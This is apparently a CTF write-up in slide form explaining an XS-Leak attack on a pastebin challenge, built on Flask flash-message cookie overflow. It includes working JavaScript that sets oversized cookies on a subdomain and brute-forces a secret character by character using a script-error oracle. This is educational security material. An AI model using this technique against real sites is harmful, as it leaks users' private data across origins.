---
title: XS Leak - CTF Challenge
tags: XS Leak, XSS, CTF
description: View the slide with "Slide Mode".
---

# XS Leak

- What is XS Leak? 
- What is CSRF?

---

## XS Leak

- Side channel attacks
- Leak user information

---

## CSRF Attack

- Affects the data

---

XS Leak Example

- evil.com
- bank.com
- evil.com attempts load bank.com/my_receipt?q=groceries as a script
- Fail => 404 Status Code
- Success => 200 Status Code 

---

### XS Leak

```javascript
function probeError(url) {
  let script = document.createElement('script');
  script.src = url;
  script.onload = () => console.log('Onload event triggered');
  script.onerror = () => console.log('Error event triggered');
  document.head.appendChild(script);
}
```


---

# Challenge

---

##### Preview Paste

```javascript
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="/static/style.css" />
    </head>
    <body>
        <div class="container tall">
            <iframe src="https://sandbox.pastebin-3.mc.ax?id=f809ec3a06e5b7a114b4ba7a42926a185351774feee3ac95ae67228ccf2cea68"></iframe>
        </div>
    </body>
</html>
```
- Different domain `https://sandbox.paste...`

---

### Rendering 

```javascript
        <script src="/static/purify.min.js"></script>
        <script>
            (async() => {
                await new Promise(
                    (resolve) => window.addEventListener('load', resolve)
                );
                document.body.innerHTML = DOMPurify.sanitize(
                    `"tested"`.slice(1, -1)
                );
            })()
        </script>        
```

- Is XSS possible?

---

- `${alert(1)}`
- String interpolation

--- 

## Source Code

```python
def execute(query, params=())
def check_login(username, password)
def create_account(username, password)
def create_paste(paste, username)
def get_pastes(username)
def get_paste(paste_id)
def index()
def login()
def register()
def home()
def logout()
def init()
```

---

```python
@app.route('/create_paste', methods=['POST'])
def create():
    if 'username' not in session:
        return redirect('/')
    paste_id = create_paste(
        request.form['paste'],
        session['username']
    )
    return redirect(f'/view?id={paste_id}')
```

---

```python
@app.route('/search')
def search():
    if 'username' not in session:
        return redirect('/')
        
    if 'query' not in request.args:
        flash('Please provide a query!')
        return redirect('/home')
        
    query = str(request.args.get('query'))
    results = (
        paste for paste in get_pastes(session['username'])
        if query in get_paste(paste)
    )
    
    try:
        flash(f'Result found: {next(results)}.')
    except StopIteration:
        flash('No results found.')
    return redirect('/home')
```

---

## Flask Flashing

- Record Message at end of request
- Access it in next view being rendered.

+ What does this require?

---

## Excerpt from Flask Documentation

- Note that browsers and sometimes web servers enforce a limit on cookie sizes.
- This means that flashing messages that are too large for session cookies causes message flashing to fail silently.

---

# Exploit

1. Set cookie on sub-domain - large enough
2. Bruteforce flag char by char
3. Right guess => Big cookie from main domain
4. Crashes application - Causes error

```
Bad Request

Error parsing headers: 'limit request headers fields size'
```

---

```javascript
function set() {
    document.cookie = `a=${'a'.repeat(4096-90)}; domain=.pastebin-3.mc.ax`
    document.cookie = `b=${'a'.repeat(4096-90)}; domain=.pastebin-3.mc.ax`
}

```

---

```javascript
(async () => {
    let prefix = "flag{";
    let base = "https://pastebin-3.mc.ax"
    set();
    while (!prefix.endsWith('}')) {
        for (let i = 0; i < alphabet.length; i++) {
            let attempt = prefix + alphabet[i];

            let subwindow = window.open(`${base}/search?query=` + encodeURIComponent(attempt));
            await wait(500);
            subwindow.close();

            if (await probeError(`${base}/home`)) {
                unset();
                prefix = attempt;
                break;
            }
        }
    }
})();

```
